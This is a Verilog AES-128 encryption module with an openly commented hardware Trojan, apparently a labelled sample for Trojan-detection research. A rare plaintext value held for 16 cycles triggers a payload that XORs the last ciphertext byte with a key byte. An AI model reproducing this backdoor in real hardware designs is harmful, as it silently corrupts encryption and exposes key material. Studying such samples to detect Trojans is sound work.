module aes_128(clk, rst_n, state, key, out);
    input          clk;
    // Trojan Insertion: Add reset for Trojan state machine
    input          rst_n;
    input  [127:0] state, key;
    output [127:0] out;
    reg    [127:0] s0, k0;
    wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                   k1, k2, k3, k4, k5, k6, k7, k8, k9,
                   k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
    // Trojan Insertion: Wire to hold original output before payload is applied
    wire   [127:0] original_out;

    // Trojan Insertion: Begin Hardware Trojan logic
    // This Trojan activates when a specific plaintext is held for 16 consecutive cycles.
    // When activated, it corrupts the last byte of the ciphertext by XORing it with the last byte of the key.
    
    // 1. Trigger condition: A rare plaintext value
    localparam [31:0] TRIGGER_VAL = 32'hDEADBEEF;
    localparam [4:0]  TRIGGER_CYCLES = 5'd15;
    
    wire trigger_condition;
    reg  [4:0] trojan_counter;
    reg  trojan_active;

    // The trigger condition is met if the upper 32 bits of the plaintext match the magic value.
    assign trigger_condition = (state[127:96] == TRIGGER_VAL);
    
    // 2. Trigger state machine: Counter to ensure condition is sustained
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_counter <= 5'd0;
            trojan_active  <= 1'b0;
        end else begin
            if (trigger_condition) begin
                if (trojan_counter == TRIGGER_CYCLES) begin
                    trojan_active <= 1'b1; // Activate the Trojan payload
                end else begin
                    trojan_counter <= trojan_counter + 1;
                end
            end else begin
                // If the trigger condition is ever false, reset the counter and deactivate the Trojan.
                trojan_counter <= 5'd0;
                trojan_active  <= 1'b0; 
            end
        end
    end
    
    // 3. Payload: Corrupt the output if the Trojan is active
    assign out = trojan_active ? (original_out ^ {120'b0, key[7:0]}) : original_out;
    // Trojan Insertion: End Hardware Trojan logic

    always @ (posedge clk)
      begin
        s0 <= state ^ key;
        k0 <= key;
      end

    expand_key_128
        a1 (clk, k0, k1, k0b, 8'h1),
        a2 (clk, k1, k2, k1b, 8'h2),
        a3 (clk, k2, k3, k2b, 8'h4),
        a4 (clk, k3, k4, k3b, 8'h8),
        a5 (clk, k4, k5, k4b, 8'h10),
        a6 (clk, k5, k6, k5b, 8'h20),
        a7 (clk, k6, k7, k6b, 8'h40),
        a8 (clk, k7, k8, k7b, 8'h80),
        a9 (clk, k8, k9, k8b, 8'h1b),
       a10 (clk, k9,   , k9b, 8'h36);

    one_round
        r1 (clk, s0, k0b, s1),
        r2 (clk, s1, k1b, s2),
        r3 (clk, s2, k2b, s3),
        r4 (clk, s3, k3b, s4),
        r5 (clk, s4, k4b, s5),
        r6 (clk, s5, k5b, s6),
        r7 (clk, s6, k6b, s7),
        r8 (clk, s7, k7b, s8),
        r9 (clk, s8, k8b, s9);

    final_round
        // Trojan Insertion: Output of final_round is redirected to 'original_out'
        rf (clk, s9, k9b, original_out);
endmodule

